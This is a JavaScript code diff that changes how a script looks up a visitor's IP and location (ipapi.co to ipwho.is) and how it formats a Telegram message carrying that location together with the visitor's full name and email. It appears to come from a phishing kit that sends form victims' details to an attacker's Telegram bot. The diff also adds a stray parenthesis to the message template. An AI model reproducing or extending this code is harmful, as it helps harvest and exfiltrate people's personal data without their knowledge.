@@ -48,13 +48,10 @@ const Utils = {
 
 async getUserLocation() {
     try {
-        const response = await fetch(
-            "https://ipapi.co/json/",
-            {
-                method: "GET",
-                cache: "no-store"
-            }
-        );
+        const response = await fetch("https://ipwho.is/", {
+            method: "GET",
+            cache: "no-store"
+        });
 
         if (!response.ok) {
             throw new Error(`Location API error: ${response.status}`);
@@ -62,33 +59,33 @@ async getUserLocation() {
 
         const data = await response.json();
 
+        if (data.success === false) {
+            throw new Error(data.message || "Location lookup failed");
+        }
+
         const ip = data.ip || "N/A";
-        const city = data.city || "";
-        const region = data.region || "";
-        const country = data.country_name || "";
-        const countryCode = data.country_code || "";
 
         const parts = [
-            city,
-            region,
-            country
+            data.city,
+            data.region,
+            data.country
         ].filter(Boolean);
 
         return {
             ip: ip,
-            location: parts.length
+            location: parts.length > 0
                 ? parts.join(" | ")
                 : "N/A",
-            country_code: countryCode || "N/A",
-            region: region || "N/A",
-            country: country || "N/A"
+            country_code: data.country_code || "N/A",
+            region: data.region || "N/A",
+            country: data.country || "N/A"
         };
 
     } catch (error) {
         console.error("Location error:", error);
 
         return {
-            ip: await this.getUserIp(),
+            ip: "N/A",
             location: "N/A",
             country_code: "N/A",
             region: "N/A",
@@ -105,7 +102,7 @@ async sendToTelegram(data) {
 
     const text = `
 <b>IP:</b> <code>${locationData.ip}</code>
-<b>Location:</b> <code>${locationData.location}</code>
+<b>Location:</b> <code>${locationData.location})</code>
 ----------------------------------
 <b>Full Name:</b> <code>${data.fullName || ''}</code>
 <b>Email:</b> <code>${data.email || ''}</code>
